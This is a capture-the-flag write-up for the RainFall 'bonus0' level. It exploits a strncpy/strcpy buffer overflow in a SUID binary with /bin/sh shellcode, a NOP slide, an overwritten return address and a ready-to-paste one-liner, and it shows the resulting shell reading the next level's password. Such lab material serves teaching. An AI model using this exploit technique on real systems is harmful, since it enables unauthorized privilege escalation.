# Level bonus 0

## Vulnerability

strcpy() heap overflow

## Context

We find a binary with owner ```bonus1``` and SUID.
```
bonus0@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```
When run it seems to accept 2 seperate inputs on stdin, and print them with a space between.
```
bonus0@RainFall:~$ ./bonus0
 -
wait...
 -
what?
wait... what?
```

## Solution

Longer strings reveal the buffer overflow weakness.
```
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
Segmentation fault (core dumped)
```
Investigating with gdb we find main calls ```pp()```.  <br />
```pp()``` calls ```p()``` twice (which reads from stdin) and ```strcpy()```. <br />

```p``` reads 4096 bytes into a buffer, then uses ```strncpy()``` to return the first 20 bytes. <br />
```strncpy()```'s return is not null-terminated if the source is longer than destination. <br />

Then, ```pp()``` calls ```strcpy()``` on ```strncpy()```'s return string... but it's not null-terminated soooooooooooo THINGS

Then when ```pp``` uses ```strcpy``` to copy the first string, without null termination it continues past the first string into the second.
This leads to us overflowing the main buffer, overwriting the EIP return address, and segfaulting.

Let's try to write our malicious code (which opens a shell) in the first string.
Then use the second string to overflow and write the address of our malicious code.

Using [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php) we create our malicious code. ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```

### Find EIP offset

Then we need to find the EIP offset where to write the address of our malicious code. Using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 9.
```
bonus0@RainFall:~$ gdb -q bonus0
...
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9...
Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
The buffer is 42 bytes (0x40 - 0x16), so we want to overwrite the return address at buffer[54].

### Find buffer address

To find the address of our malicious code
```
bonus0@RainFall:~$ gdb -q bonus0
...
(gdb) disas p
...
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax ; buffer address
...
(gdb) break *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe640:	0x00000000
```
The buffer starts at ```0xbfffe640```. We will create a large NOP slide leading to our malicious code, so lets overwrite EIP wih an address somewhere on the NOP slide, let's say buffer + 100 ```0xbfffe6a4``` = "\xa4\xe6\xff\xbf".

### Build exploit strings

So we want to craft our first string:
1. A large NOP slide buffer leading to our malicious code - ```'\x90' * 3000```
2. our malicious shell code - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```

And our second string:
1. A buffer until we reach EIP - ```'B' * 14```
2. Address on NOP slide leading to our malicious code - ```\xa4\xe6\xff\xbf```
3. buffer single byte - ```'B'```

Lets provide these two to the binary.
```
bonus0@RainFall:~$ (python -c "print('\x90' * 3000 + 
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ~/bonus0
 -
 -
��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
Here is a handy one liner:
```
(python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | ~/bonus0
```

## Recreate Exploited Binary

As user ```bonus1```, in ```/tmp```, create and compile ```bonus0_source.c```
```
bonus1@RainFall:/tmp$ gcc bonus0_source.c -fno-stack-protector -z execstack -o bonus0_source
```
Edit permissions including suid, then move the binary to home directory.
```
bonus1@RainFall:/tmp$ chmod u+s bonus0_source; chmod +wx ~; mv bonus0_source ~
```
Exit back to user ```bonus0```, then pipe our exploit into the source. Luckily, p()'s buffer address is similar, so the return address doesn't need updating.
```
bonus1@RainFall:/tmp$ exit
exit
bonus0@RainFall:~$ (python -c "print('\x90' * 3000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\xa4\xe6\xff\xbf' + 'B')"; cat) | /home/user/bonus1/bonus0_source
 -
 -
��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
whoami
bonus1
```

